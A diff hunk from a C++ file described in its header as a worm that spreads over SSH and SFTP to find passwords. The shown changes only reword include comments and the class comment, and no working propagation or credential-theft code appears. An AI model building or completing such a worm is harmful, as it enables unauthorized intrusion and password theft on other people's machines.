@@ -3,14 +3,14 @@
 //description - WORM using sftp and ssh connection for password finding in (any)OS but (tails os or tor based OS)
 //WARNING!!
 
-#include <libssh/libssh.h>  // Include the SSH library
-#include <libssh/sftp.h>    // Include the SFTP library for file transfer
+#include <libssh/libssh.h>  // SSH for secure connection with Target and interrupt it.
+#include <libssh/sftp.h>    //Tthe SFTP library for file transfer.
 #include <iostream>         // For input-output operations
-#include <fstream>          // For file operations (though not used in this code)
-#include <vector>           // For using vectors to store data
+#include <fstream>          // For file operations (though not used in this code) but if you want to use this use it with caution!
+#include <vector>           // Using vectors to store data
 #include <sstream>          // For string stream operations to parse IP addresses
 
-// Worm class to represent the worm functionality
+// Worm class 
 class Worm {
 private:
     std::string network;  // Store network address as a string
